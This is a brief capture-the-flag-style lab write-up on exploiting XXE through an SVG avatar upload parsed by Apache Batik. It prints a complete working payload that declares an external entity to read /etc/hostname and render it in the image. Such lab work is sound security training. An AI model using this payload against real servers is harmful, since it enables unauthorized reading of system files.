# Practitioner Lab 57: Exploiting XXE via image file upload

---

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

![Untitled](Practitioner%20Lab%2057%20Exploiting%20XXE%20via%20image%20file%20%20168d36d5170b4abc83165a03790f46e4/Untitled.png)

I went and found an svg image to see if it would allow me to upload it. Since SVG is basically an xml image so the system might just allow it.

I used the following payload

```
Content-Disposition: form-data; name="avatar"; filename="exploit.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

![Untitled](Practitioner%20Lab%2057%20Exploiting%20XXE%20via%20image%20file%20%20168d36d5170b4abc83165a03790f46e4/Untitled%201.png)

This was the answer.

![Untitled](Practitioner%20Lab%2057%20Exploiting%20XXE%20via%20image%20file%20%20168d36d5170b4abc83165a03790f46e4/Untitled%202.png)

This solved the lab.